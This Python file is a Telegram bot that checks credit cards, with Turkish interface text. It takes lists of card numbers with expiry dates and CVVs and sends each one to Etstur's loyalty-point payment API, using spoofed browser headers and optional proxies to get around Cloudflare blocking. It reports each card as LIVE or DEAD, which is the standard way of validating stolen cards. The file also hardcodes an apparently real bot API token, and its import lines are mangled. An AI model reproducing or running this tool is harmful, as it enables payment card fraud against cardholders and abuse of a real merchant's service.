# language: Python, file: bot.py, target: Linux, Python 3.10+
asyncio
aiohttp
logging
aiogram
aiogram.filters
aiogram.fsm.context
aiogram.fsm.state
aiogram.fsm.storage.memory

API_TOKEN = "8836035013:AAHXLqHRwe9GIfV5dzvcrT1S2_RmAaHYb64"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class CheckerState(StatesGroup):
    waiting_for_uuid = State()
    waiting_for_proxy = State()
    waiting_for_cards = State()

async def puan_sorgula(session, booking_uuid, proxy_url, kart_no, ay, yil):
    if len(yil) == 4:
        yil = yil[2:]

    h = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": "null",
        "content-type": "application/json",
        "origin": "https://www.etstur.com",
        "referer": f"https://www.etstur.com/checkout/checkout/hotel/step2?bookingUuid={booking_uuid}",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }

    data = {
        "bookingUuid": booking_uuid,
        "creditCardOwnerName": "GUEST USER",
        "creditCardNumber": kart_no,
        "creditCardValidMonth": ay,
        "creditCardValidYear": yil,
        "typeId": "52",
        "groupId": 1,
        "isSaveCard": False,
        "usePoint": False
    }

    try:
        async with session.post(
            "https://www.etstur.com/services/api/hotel/payment/get-credit-card-point",
            headers=h, json=data, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            if r.status == 403:
                return "403_ERR", 0, "", "Cloudflare / 403 Engeli (Proxy IP'si engellenmiş olabilir)"
            if r.status != 200:
                return "DEAD", 0, "", f"HTTP_{r.status}"
            
            result = await r.json()
            msg = str(result.get("errorMessage", "")).strip()
            res = result.get("result") or {}
            puan = res.get("pointAmount", 0)
            success = res.get("success", False)

            if success or puan > 0:
                return "LIVE_PUAN", puan, res.get("currency", "TL"), msg
            elif msg:
                return "MSG_DEAD", 0, "", msg
            else:
                return "DEAD", 0, "", "Declined"
    except asyncio.TimeoutError:
        return "PROXY_ERR", 0, "", "Proxy Bağlantı Zaman Aşımı (Proxy Çalışmıyor/Yavaş)"
    except Exception as e:
        return "PROXY_ERR", 0, "", f"Proxy Hatası: {str(e)}"

async def process_single(session, booking_uuid, proxy_url, satir):
    parca = satir.replace(";", "|").replace(",", "|").split("|")
    if len(parca) < 3:
        return f"❌ {satir} -> Format Hatalı"

    kart_no = parca[0].strip().replace(" ", "")
    ay = parca[1].strip().zfill(2)
    yil = parca[2].strip()

    if len(kart_no) != 16:
        return f"❌ {kart_no} -> Geçersiz Uzunluk"

    durum, puan, para, mesaj = await puan_sorgula(session, booking_uuid, proxy_url, kart_no, ay, yil)

    if durum == "LIVE_PUAN":
        return f"🟢 **LIVE** | `{kart_no}` | **{puan} {para}** | {mesaj}"
    elif durum == "403_ERR":
        return f"🚫 **PROXÜ ENGELİ (403)** | `{kart_no}` | {mesaj}"
    elif durum == "PROXY_ERR":
        return f"⚠️ **PROXY SORUNU** | `{kart_no}` | {mesaj}"
    elif durum == "MSG_DEAD":
        return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
    elif durum == "DEAD":
        return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
    else:
        return f"⚠️ **HATA** | `{kart_no}` | {durum} - {mesaj}"

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    await state.set_state(CheckerState.waiting_for_uuid)
    await message.answer("🤖 **Etstur Puan Checker Bot**\n\nAdım 1/2: Lütfen kullanmak istediğiniz **Booking UUID** kodunu gönderin:")

@dp.message(CheckerState.waiting_for_uuid)
async def handle_uuid(message: types.Message, state: FSMContext):
    uuid_input = message.text.strip()
    if len(uuid_input) < 10:
        await message.answer("⚠️ Geçersiz UUID! Lütfen geçerli bir Booking UUID gönderin:")
        return

    await state.update_data(booking_uuid=uuid_input)
    await state.set_state(CheckerState.waiting_for_proxy)
    await message.answer("✅ **UUID Kaydedildi.**\n\nAdım 2/2: Doğrudan **IP:PORT** şeklinde HTTP proxy adresini gönderin (Kullanmayacaksanız `yok` yazın):")

@dp.message(CheckerState.waiting_for_proxy)
async def handle_proxy(message: types.Message, state: FSMContext):
    proxy_input = message.text.strip()
    
    if proxy_input.lower() == "yok":
        proxy_val = None
    else:
        # Doğrudan girilen IP:PORT adresinin başına http:// ekliyoruz
        proxy_val = f"http://{proxy_input}"

    await state.update_data(proxy=proxy_val)
    await state.set_state(None)
    await message.answer(f"✅ **Ayarlar Tamamlandı!**\nProxy: `{proxy_val if proxy_val else 'Kullanılmıyor'}`\n\nKartları sorgulamak için **/kontrol** komutunu yazın.")

@dp.message(Command("kontrol"))
async def cmd_kontrol(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    booking_uuid = user_data.get("booking_uuid")

    if not booking_uuid:
        await state.set_state(CheckerState.waiting_for_uuid)
        await message.answer("⚠️ Henüz Booking UUID girilmedi! Baştan başlamak için **/start** komutunu yazın:")
        return

    await state.set_state(CheckerState.waiting_for_cards)
    await message.answer(f"📝 Sorgulanacak kartları alt alta gönderin (Format: `KARTNO|AY|YIL|CVV`):")

@dp.message(CheckerState.waiting_for_cards)
async def handle_cards(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    booking_uuid = user_data.get("booking_uuid")
    proxy_url = user_data.get("proxy")

    satirlar = [s.strip() for s in message.text.split("\n") if s.strip()]
    if not satirlar:
        await message.answer("⚠️ Liste boş.")
        return

    await message.answer(f"⏳ Toplam {len(satirlar)} kart taranıyor...")
    
    sem = asyncio.Semaphore(5)
    connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for satir in satirlar:
            async def bounded_task(s=satir):
                async with sem:
                    return await process_single(session, booking_uuid, proxy_url, s)
            tasks.append(bounded_task())

        results = await asyncio.gather(*tasks)

    await state.clear()
    await state.update_data(booking_uuid=booking_uuid, proxy=proxy_url)
    
    chunk = ""
    for res in results:
        if len(chunk) + len(res) > 3800:
            await message.answer(chunk, parse_mode="Markdown")
            chunk = ""
        chunk += res + "\n"
    
    if chunk:
        await message.answer(chunk, parse_mode="Markdown")
    
    await message.answer("✅ **Tarama Tamamlandı!**\nYeni kartlar için tekrar **/kontrol** yazabilir veya ayarları değiştirmek için **/start** yapabilirsiniz.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
